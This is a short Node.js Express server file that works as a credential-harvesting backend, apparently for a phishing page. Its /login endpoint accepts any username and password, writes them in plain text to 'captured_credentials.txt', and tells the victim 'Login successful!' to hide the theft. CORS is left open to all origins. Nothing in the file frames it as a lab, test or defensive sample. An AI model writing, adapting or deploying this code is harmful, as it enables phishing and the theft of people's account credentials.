// server.js
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = 5000;

app.use(bodyParser.json());
app.use(cors());

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // Save the credentials to a file or database
  const data = `Username: ${username}, Password: ${password}\n`;
  fs.appendFile('captured_credentials.txt', data, (err) => {
    if (err) {
      console.error('Error writing to file', err);
      res.status(500).send('Internal Server Error');
    } else {
      res.status(200).send('Login successful!');
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});